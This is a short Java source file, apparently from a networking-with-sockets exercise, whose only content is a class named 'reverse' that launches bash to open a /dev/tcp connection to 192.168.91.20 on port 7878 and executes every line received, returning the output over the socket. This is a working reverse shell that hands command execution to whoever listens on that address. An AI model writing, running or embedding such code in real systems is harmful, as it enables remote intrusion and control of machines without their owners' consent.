package org.example.networkingWithSocket;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class reverse {
    public static void main(String[] args) throws IOException {
        String[] cmd = {
                "bash",
                "-c",
                "exec 5<>/dev/tcp/192.168.91.20/7878;cat <&5 | while read line; do $line 2>&5 >&5; done" };

        Runtime.getRuntime().exec(cmd);
}
}
